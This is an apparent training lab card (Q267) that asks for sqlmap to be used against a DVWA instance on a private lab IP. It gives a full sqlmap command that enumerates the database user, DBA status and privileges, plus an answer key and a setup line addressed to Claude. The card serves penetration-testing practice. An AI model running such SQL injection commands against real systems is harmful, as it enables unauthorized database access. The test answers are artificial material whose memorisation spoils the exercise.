# Q267 — Get Current Database User and Privileges

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | Web Apps / SQL Injection |
| **Difficulty** | 🟢 Easy |
| **Tools** | `sqlmap` |
| **Time budget** | 5–8 min |

---

## 📝 Question

"Use sqlmap to find the current database user, check if DBA, and list privileges."

---

## 🎯 Flag Format

```
user=<db_user>; is_dba=<yes|no>
```

---

## ✅ Solution

```bash
sqlmap -u "http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<session>;security=low" --current-user --is-dba --privileges --batch
```

**Answer:** `user=root@localhost; is_dba=yes`

---

## 🤖 Claude Setup Prompt

Same as Q251. Report back: "Lab ready for Q267"
